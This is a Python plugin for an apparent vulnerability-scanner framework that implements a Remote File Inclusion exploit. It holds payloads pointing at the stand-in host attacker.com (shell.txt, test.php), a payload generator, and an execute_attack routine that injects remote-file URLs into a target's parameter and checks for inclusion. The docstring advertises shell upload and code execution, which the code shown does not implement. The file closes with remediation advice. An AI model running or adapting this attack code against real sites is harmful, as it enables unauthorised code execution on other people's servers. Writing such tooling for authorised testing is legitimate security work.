"""
RFI (Remote File Inclusion) Exploit Plugin

This plugin provides exploit capabilities for RFI vulnerabilities including:
- Remote shell upload
- Remote code execution via included files
- Information gathering
"""

import sys
import os
from typing import Dict, List, Any, Optional
import logging

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from scanner.plugins.exploit_plugin import ExploitPlugin

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False
    logging.warning("Requests library not available")

logger = logging.getLogger(__name__)


class RFIPlugin(ExploitPlugin):
    """RFI exploit plugin for remote code execution via file inclusion."""
    
    # Test payloads
    TEST_PAYLOADS = [
        'http://attacker.com/shell.txt',
        'http://attacker.com/test.php',
        '//attacker.com/shell.txt',
    ]
    
    @property
    def vulnerability_type(self) -> str:
        return 'rfi'
    
    @property
    def name(self) -> str:
        return 'RFI Exploit'
    
    @property
    def description(self) -> str:
        return 'Remote File Inclusion exploit plugin for including and executing remote files.'
    
    @property
    def version(self) -> str:
        return '2.0.0'
    
    def generate_payloads(self, context: Optional[Dict[str, Any]] = None) -> List[str]:
        """Generate RFI payloads."""
        context = context or {}
        remote_server = context.get('remote_server', 'attacker.com')
        remote_file = context.get('remote_file', 'shell.txt')
        
        payloads = [
            f'http://{remote_server}/{remote_file}',
            f'https://{remote_server}/{remote_file}',
            f'//{remote_server}/{remote_file}',
        ]
        
        return payloads
    
    def execute_attack(self, target_url: str, vulnerability_data: Dict[str, Any],
                      config: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """Execute RFI exploit attack."""
        if not HAS_REQUESTS:
            return {
                'success': False,
                'error': 'Requests library not available',
                'vulnerability_type': 'rfi',
            }
        
        config = config or {}
        parameter = vulnerability_data.get('parameter')
        remote_server = config.get('remote_server')
        
        if not parameter or not remote_server:
            return {
                'success': False,
                'error': 'Missing parameter or remote_server config',
                'vulnerability_type': 'rfi',
            }
        
        logger.info(f"Attempting RFI exploitation on {target_url}")
        
        # Try to include remote file
        exploitation_result = self._attempt_rfi(target_url, parameter, remote_server, config)
        
        if exploitation_result['success']:
            logger.info(f"Successfully exploited RFI on {target_url}")
            return {
                'success': True,
                'evidence': exploitation_result.get('evidence', ''),
                'vulnerability_type': 'rfi',
                'message': 'Successfully included remote file',
            }
        else:
            return {
                'success': False,
                'error': 'Could not exploit RFI vulnerability',
                'message': 'RFI exploitation attempt was unsuccessful',
                'vulnerability_type': 'rfi',
            }
    
    def _attempt_rfi(self, url: str, parameter: str, remote_server: str,
                    config: Dict[str, Any]) -> Dict[str, Any]:
        """Attempt to exploit RFI."""
        verify_ssl = config.get('verify_ssl', False)
        timeout = config.get('timeout', 10)
        
        test_marker = 'RFI_TEST_SUCCESS'
        remote_url = f'http://{remote_server}/test.txt?marker={test_marker}'
        
        try:
            params = {parameter: remote_url}
            response = requests.get(url, params=params, timeout=timeout, verify=verify_ssl)
            
            if test_marker in response.text:
                return {
                    'success': True,
                    'evidence': f'Successfully included file from {remote_server}, marker found'
                }
        except Exception as e:
            logger.debug(f"Error in RFI exploitation: {e}")
        
        return {
            'success': False,
            'error': 'Could not include remote file'
        }
    
    def get_severity_level(self) -> str:
        return 'critical'
    
    def get_remediation_advice(self) -> str:
        return (
            'Prevent RFI attacks:\n'
            '1. Never use user input in file paths\n'
            '2. Disable allow_url_include in PHP\n'
            '3. Use whitelist for allowed files\n'
            '4. Validate and sanitize all input\n'
            '5. Use absolute paths\n'
            '6. Implement proper access controls\n'
            '7. Disable remote file access\n'
            '8. Use security headers'
        )
